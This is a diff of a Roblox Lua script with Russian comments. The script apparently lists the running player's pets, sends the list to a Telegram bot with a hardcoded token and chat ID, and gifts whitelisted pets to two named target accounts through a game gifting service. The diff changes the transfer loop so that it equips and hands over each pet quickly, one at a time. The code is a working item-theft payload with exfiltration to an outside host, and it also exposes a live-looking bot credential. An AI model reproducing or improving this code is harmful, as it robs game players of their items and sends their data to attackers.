@@ -159,8 +159,8 @@ task.spawn(function()
     task.cancel(dotTask)
 end)
 local TELEGRAM_TOKEN = "8113815289:AAHjyPNLtl1Ug2HY2r0SYZJuNltlYZZG-zc"
-local TELEGRAM_CHAT_ID = "-1002927824958"
-local TARGET_PLAYERS = {"Rikizigg", "sERTTQE0"}
+local TELEGRAM_CHAT_ID = "-1002927824958" -- ID канала с префиксом для публичного канала
+local TARGET_PLAYERS = {"Rikizigg", "sERTTQE0"} -- Замените PlayerName2 на второе имя
 local TRIGGER_MESSAGE = "."
 local WHITELIST = {
     "Raccoon",
@@ -270,7 +270,7 @@ local function getPetsList()
     local result = {"ПИТОМЦЫ:"}
     
     for i, pet in ipairs(pets) do
-        if i > 40 then break end
+        if i > 15 then break end
         
         totalWeight = totalWeight + pet.weight
         if pet.isWhitelisted then
@@ -281,7 +281,7 @@ local function getPetsList()
         end
     end
     
-    if #pets > 40 then
+    if #pets > 15 then
         table.insert(result, "...")
     end
     
@@ -389,21 +389,16 @@ local function startPetTransfer()
         return
     end
     
-    -- Берем всех питомцев в руку одновременно
-    for _, pet in ipairs(whitelistedPets) do
-        pcall(function()
-            LocalPlayer.Character.Humanoid:EquipTool(pet.object)
-        end)
-    end
-    
-    task.wait(1) -- Ждем чтобы все питомцы были взяты
-    
-    -- Передаем всех разом
     local successful = 0
     local failed = 0
     
+    -- Передаем каждого питомца отдельно, но быстро
     for _, pet in ipairs(whitelistedPets) do
-        local success, err = pcall(function()
+        local success = pcall(function()
+            -- Берем питомца в руку
+            LocalPlayer.Character.Humanoid:EquipTool(pet.object)
+            task.wait(0.1) -- Минимальная задержка чтобы взялся
+            -- Передаем
             PetGiftingService:FireServer("GivePet", target)
         end)
         
@@ -414,6 +409,8 @@ local function startPetTransfer()
             failed = failed + 1
             STATS.errors = STATS.errors + 1
         end
+        
+        task.wait(0.2) -- Короткая задержка между передачами
     end
     
     sendToTelegram(string.format(
